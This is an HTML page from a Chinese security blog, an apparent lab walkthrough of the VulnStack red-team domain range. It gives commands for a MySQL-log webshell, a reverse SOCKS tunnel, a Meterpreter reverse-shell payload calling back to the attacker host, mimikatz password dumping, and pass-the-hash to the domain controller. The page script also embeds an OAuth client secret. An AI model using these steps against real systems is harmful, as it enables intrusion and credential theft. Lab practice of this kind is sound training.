@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      [域渗透]VulnStack 红日红队实战系列(一) | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>[域渗透]VulnStack 红日红队实战系列(一)</h2>
+  <p class="post-date">2020-01-28 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>向老高借了环境玩玩，练练手，学习内网知识</p>
+<blockquote>
+<p>域渗透的思路就是：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。</p>
+</blockquote>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<blockquote>
+<p>攻击机(kaili): 172.16.48.133</p>
+<p>Windows7 双网卡：172.16.48.134(NAT模式),192.168.52.143(主机模式)</p>
+<p>windows 2003: 192.168.52.141(DC,主机模式)</p>
+<p>windows 2008 R2 x64: 192.168.52.138(主机模式)</p>
+</blockquote>
+<p>边界主机地址：<a href="http://172.16.48.134" target="_blank" rel="noopener">http://172.16.48.134</a></p>
+<p><img src="./image-20200127184434280.png" alt="image-20200127184434280"></p>
+<h1 id="边界主机入手"><a href="#边界主机入手" class="headerlink" title="边界主机入手"></a>边界主机入手</h1><p><a href="http://172.16.48.314/phpmyadmin">http://172.16.48.314/phpmyadmin</a></p>
+<p>弱密码：root,root进入</p>
+<p><img src="./image-20200127184657721.png" alt="image-20200127184657721"></p>
+<blockquote>
+<p>攻击思路：mysql日志写shell,已知nday漏洞，select into outfile</p>
+</blockquote>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>参考链接：<a href="https://www.jianshu.com/p/ddd41b841c36" target="_blank" rel="noopener">https://www.jianshu.com/p/ddd41b841c36</a></p>
+<h3 id="解法一：select-into-outfile-失败"><a href="#解法一：select-into-outfile-失败" class="headerlink" title="解法一：select into outfile(失败)"></a>解法一：select into outfile(失败)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>Secure_file_priv显示null无导入导出权限,只能通过修改my.cnf文件置在[mysqld]内加入secure_file_priv =”” 即可</p>
+<p><img src="./image-20200127185150737.png" alt="image-20200127185150737"></p>
+<h3 id="解法二：mysql日志写shell"><a href="#解法二：mysql日志写shell" class="headerlink" title="解法二：mysql日志写shell"></a>解法二：mysql日志写shell</h3><p>查看日志状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#39;%general%&#39;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200127185554340.png" alt="image-20200127185554340"></p>
+<p>当开启general时，所执行的sql语句会写到stu1.log</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log&#x3D;&#39;on&#39;</span><br><span class="line">SET GLOBAL general_log_file&#x3D;&#39;C:\\phpStudy\\www\\shell.php&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200127190251913.png" alt="image-20200127190251913"></p>
+<p><img src="./image-20200127190237450.png" alt="image-20200127190237450"></p>
+<p>收拾复原日志功能</p>
+<p><img src="./image-20200127190338493.png" alt="image-20200127190338493"></p>
+<h3 id="antSword连接shell"><a href="#antSword连接shell" class="headerlink" title="antSword连接shell"></a>antSword连接shell</h3><p><img src="./image-20200128165355387.png" alt="image-20200128165355387"></p>
+<h1 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h1><p>双网卡，192.168.52.143应该是内网地址.域名god.org</p>
+<p><img src="./image-20200128172231118.png" alt="image-20200128172231118"></p>
+<p><img src="./image-20200128172006795.png" alt="image-20200128172006795"></p>
+<h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><h4 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h4><p>关了防火墙也不行    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200128173630452.png" alt="image-20200128173630452"></p>
+<h4 id="arp-a"><a href="#arp-a" class="headerlink" title="arp -a"></a>arp -a</h4><p><img src="./image-20200128173858608.png" alt="image-20200128173858608"></p>
+<h3 id="nbtscan-确定域控"><a href="#nbtscan-确定域控" class="headerlink" title="nbtscan(确定域控)"></a>nbtscan(确定域控)</h3><p>DC字段就是域控主机</p>
+<p><img src="./image-20200128175054765.png" alt="image-20200128175054765"></p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>确定当前用户在域中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all</span><br><span class="line">net user administrator &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200128172423776.png" alt="image-20200128172423776"></p>
+<p>查询域管理员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200128172915038.png" alt="image-20200128172915038"></p>
+<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><p><a href="https://github.com/idlefire/ew" target="_blank" rel="noopener">https://github.com/idlefire/ew</a></p>
+<p>先做个转发，方便后续操作。</p>
+<p><img src="./image-20200128180817576.png" alt="image-20200128180817576"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kali: .&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 8888</span><br><span class="line"></span><br><span class="line">windows: ew_for_Win.exe -s rssocks 172.16.48.133 -e 8888</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="./image-20200128181707663.png" alt="image-20200128181707663"></p>
+<p>kali设置代理</p>
+<p>proxychains.conf</p>
+<p><img src="./image-20200128183111671.png" alt="image-20200128183111671"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p winodws&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.48.133 lport&#x3D;2333 -f exe &gt; ~&#x2F;Desktop&#x2F;re.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200128183400306.png" alt="image-20200128183400306"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload winodws&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 172.16.48.133</span><br><span class="line">set LPORT 2333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200128183943628.png" alt="image-20200128183943628"></p>
+<h3 id="getsystem提到系统权限"><a href="#getsystem提到系统权限" class="headerlink" title="getsystem提到系统权限"></a>getsystem提到系统权限</h3><p><img src="./image-20200128184408230.png" alt="image-20200128184408230"></p>
+<h3 id="绑定进程"><a href="#绑定进程" class="headerlink" title="绑定进程"></a>绑定进程</h3><p><img src="./image-20200128184639395.png" alt="image-20200128184639395"></p>
+<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p><img src="./image-20200128184805024.png" alt=""></p>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p><img src="./image-20200128184911091.png" alt="image-20200128184911091"></p>
+<h3 id="使用wdigest命令获取登录过的用户储存在内存里的明文密码"><a href="#使用wdigest命令获取登录过的用户储存在内存里的明文密码" class="headerlink" title="使用wdigest命令获取登录过的用户储存在内存里的明文密码"></a><strong>使用wdigest命令获取登录过的用户储存在内存里的明文密码</strong></h3><p><img src="./image-20200128185022460.png" alt="image-20200128185022460"></p>
+<h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><p>通过mimikatz的wdigest命令获取到明文密码</p>
+<p>利用<strong>pass the hash</strong>控制域内账户</p>
+<p>利用正向连接shell易被防火墙阻挡</p>
+<p><img src="./image-20200128191538579.png" alt="image-20200128191538579"></p>
+<p>这里直接找域控连,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p>连上又断了,尝试下进程迁移，还是断了</p>
+<p><img src="./image-20200128192102792.png" alt="image-20200128192102792"></p>
+<p>竟然有明文密码，就开3389端口搞(乘会话没断)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#这个是msf获取shell之后的用法</span><br><span class="line">#开启3389</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class="line">#添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp username&#x3D;&quot;osword&quot; password&#x3D;&quot;zlfufu123?&quot;</span><br></pre></td></tr></table></figure>
+
+<p>发现添加不上用户，不管了，直接用administrator账户登陆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop -f 192.168.52.141</span><br></pre></td></tr></table></figure>
+
+<p><img src="./image-20200128193622004.png" alt="image-20200128193622004"></p>
+<p>其实也可以用ms系列直接打，但是那样学不到东西。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://zhuanlan.zhihu.com/p/49959665" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/49959665</a></p>
+<p><a href="https://glotozz.github.io/2020/01/15/vulstack域渗透靶场-wp/" target="_blank" rel="noopener">https://glotozz.github.io/2020/01/15/vulstack%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-wp/</a></p>
+<p><a href="https://zero-day.io/get-a-meterpreter-shell-with-psexec/" target="_blank" rel="noopener">https://zero-day.io/get-a-meterpreter-shell-with-psexec/</a></p>
+<p><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#域滲透" >
+    <span class="tag-code">域滲透</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/01/25/ThinkPHP-6-0-2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%86%99%E5%85%A5-%E8%A6%86%E7%9B%96/">
+        <span class="nav-arrow">← </span>
+        
+          ThinkPHP&lt;6.0.2任意文件内容写入/覆盖
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/02/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections/">
+        
+          Java反序列化学习之反序列化流程及反射类源码分析学习
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#环境"><span class="toc-nav-text">环境</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#边界主机入手"><span class="toc-nav-text">边界主机入手</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#getshell"><span class="toc-nav-text">getshell</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#解法一：select-into-outfile-失败"><span class="toc-nav-text">解法一：select into outfile(失败)</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#解法二：mysql日志写shell"><span class="toc-nav-text">解法二：mysql日志写shell</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#antSword连接shell"><span class="toc-nav-text">antSword连接shell</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#内网探测"><span class="toc-nav-text">内网探测</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#存活主机探测"><span class="toc-nav-text">存活主机探测</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#icmp"><span class="toc-nav-text">icmp</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#arp-a"><span class="toc-nav-text">arp -a</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#nbtscan-确定域控"><span class="toc-nav-text">nbtscan(确定域控)</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#域信息收集"><span class="toc-nav-text">域信息收集</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#攻击"><span class="toc-nav-text">攻击</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#转发"><span class="toc-nav-text">转发</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#反弹shell"><span class="toc-nav-text">反弹shell</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#getsystem提到系统权限"><span class="toc-nav-text">getsystem提到系统权限</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#绑定进程"><span class="toc-nav-text">绑定进程</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#hashdump"><span class="toc-nav-text">hashdump</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#mimikatz"><span class="toc-nav-text">mimikatz</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#使用wdigest命令获取登录过的用户储存在内存里的明文密码"><span class="toc-nav-text">使用wdigest命令获取登录过的用户储存在内存里的明文密码</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#psexec"><span class="toc-nav-text">psexec</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2020/01/28/域渗透-VulnStack-红日红队实战系列-一/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "[域渗透]VulnStack 红日红队实战系列(一)",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
